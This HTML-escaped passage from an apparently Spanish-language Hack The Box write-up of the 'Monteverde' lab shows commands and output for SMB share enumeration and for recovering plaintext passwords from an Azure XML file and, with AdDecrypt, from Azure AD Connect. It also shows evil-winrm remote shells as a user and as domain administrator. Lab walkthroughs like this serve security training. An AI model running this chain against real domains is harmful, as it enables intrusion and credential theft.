&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;azure_uploads&apos; &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        azure_uploads                                           READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;zure_uploads&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    ..
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;IPC$&apos;                                                                                                                                         1 ⚙&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;PC&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    lsass
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    scerpc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-378-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    epmapper
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-1d4-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    eventlog
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-47c-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    atsvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-62c-0
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-26c-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-26c-1
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy&lt;span class=&quot;se&quot;&gt;\4&lt;/span&gt;9673
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    f9f9dd07a1a076b9
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy&lt;span class=&quot;se&quot;&gt;\5&lt;/span&gt;93
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    spoolss
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-abc-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    netdfs
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-264-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    SQLLocal&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SSQLSERVER
        fr--r--r--                2 Sun Dec 31 23:45:16 1600    sql&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;uery
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-b24-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PIPE_EVENTROOT&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    CPFATP_3900_v4.0.30319
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PSHost.132956289328053743.3900.DefaultAppDomain.miiserver
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-b14-0
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;users$&apos;                                        &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 14:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 14:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 14:14:28 2020    smorgan

&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;SYSVOL&apos;                                             &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        SYSVOL                                                  READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSVOL&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    MEGABANK.LOCAL
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;NETLOGON&apos;                                      &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        NETLOGON                                                READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETLOGON&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;users$/mhope&apos;                         &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$mhope&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    ..
        fw--w--w--             1212 Fri Jan  3 15:59:24 2020    azure.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Descargamos el archivo interesante a nuestro pc&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; --download &apos;users$/mhope/azure.xml&apos;   &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;zure.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1212 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Monteverde/nmap/10.10.10.172-users_mhope_azure.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo leemos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat mhope-azure.xml                                                                                                                                                                                        1 ⚙ &lt;/span&gt;
&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                   
  &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
      &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;StartDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EndDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;G &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;KeyId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
      &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt;/S&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos una credenciales para mhope&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; mhope &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;4n0therD4y@n0th3r$&apos;&lt;/span&gt;                                                                                                                                             1 ⚙
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;

┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀pro&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/home/…/Escritorio/HTB/Monteverde/nmap]
└─# crackmapexec winrm 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; mhope &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;4n0therD4y@n0th3r$&apos;&lt;/span&gt;                                                                                                                                           1 ⚙
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.172 -u mhope -p &apos;4n0therD4y@n0th3r$&apos;                                                                                                                                          130 ⨯ 1 ⚙&lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Desk&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir

    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;         1/3/2020   5:48 AM             32 &lt;span class=&quot;s2&quot;&gt;&quot;user.txt&quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a sacar la flag .txt&lt;/p&gt;

&lt;h1 id=&quot;microsoft-azure-ad-sync-privilege-escalation&quot;&gt;Microsoft Azure AD Sync Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Procedemos a enumerar el sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /all

USER INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;

User Name      SID
&lt;span class=&quot;o&quot;&gt;==============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt;
megabank&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

Group Name                                  Type             SID                                          Attributes
&lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt;
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
&lt;span class=&quot;s2&quot;&gt;&quot;MEGABANK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;zure Admins     &quot;&lt;/span&gt;                  Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;

Privilege Name                Description                    State
&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Explotacion del Grupo de Azure Admins:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Microsoft Azure AD Sync Privilege Escalation&quot;&lt;/span&gt;

https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/    &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Fuente de Info   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Comando a aplicar en la ruta en la que subimos los archivos

https://github.com/VbScrub/AdSyncDecrypt/releases  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Github descargar el .zip y descomprimirlo

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos descargamos los recursos y los descomprimimos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
AdDecrypt.exe  AdDecrypt.zip  mcrypt.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos subimos los archivos a la maquina en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;C:\Windows\Temp\Prueba\ ------------ &quot;&lt;/code&gt;
Nos desplazamos a esta ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&amp;gt; &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;AdDecrypt.exe -FullSQL&quot;&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Azure AD Sync&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rueba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dDecrypt.exe -FullSQL        &quot;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt;
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
&lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt;

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!
&lt;span class=&quot;s2&quot;&gt;&quot;
DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL &quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Conseguimos sacar la contraseña en texto claro del administrator
Procedemos a sacar la flag conectandonos con Evil-Winrm&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah! &lt;/span&gt;

Evil-WinRM shell v3.3
